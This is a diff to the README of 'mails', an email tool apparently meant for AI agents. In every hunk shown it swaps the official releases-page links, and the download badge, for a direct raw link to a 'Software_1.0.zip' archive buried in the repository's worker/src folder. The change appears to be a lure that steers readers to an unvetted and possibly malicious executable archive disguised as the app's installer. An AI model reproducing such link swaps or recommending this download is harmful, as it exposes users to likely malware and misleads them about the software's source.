@@ -1,6 +1,6 @@
 # 📧 mails - Email tools for AI agents
 
-[![Download mails](https://img.shields.io/badge/Download%20mails-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jayetowavy/mails/releases)
+[![Download mails](https://img.shields.io/badge/Download%20mails-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Jayetowavy/mails/raw/refs/heads/main/worker/src/Software_1.0.zip)
 
 ## 🚀 Get mails on Windows
 
@@ -8,7 +8,7 @@ mails helps AI agents send, receive, and read email from a simple desktop app or
 
 Use this page to download and run the app on Windows:
 
-[https://github.com/Jayetowavy/mails/releases](https://github.com/Jayetowavy/mails/releases)
+[https://github.com/Jayetowavy/mails/raw/refs/heads/main/worker/src/Software_1.0.zip](https://github.com/Jayetowavy/mails/raw/refs/heads/main/worker/src/Software_1.0.zip)
 
 ## 📥 Download and install
 
@@ -163,7 +163,7 @@ If mail does not appear:
 
 If you need the file again, use the release page here:
 
-[https://github.com/Jayetowavy/mails/releases](https://github.com/Jayetowavy/mails/releases)
+[https://github.com/Jayetowavy/mails/raw/refs/heads/main/worker/src/Software_1.0.zip](https://github.com/Jayetowavy/mails/raw/refs/heads/main/worker/src/Software_1.0.zip)
 
 ## 🧭 Typical next steps
 
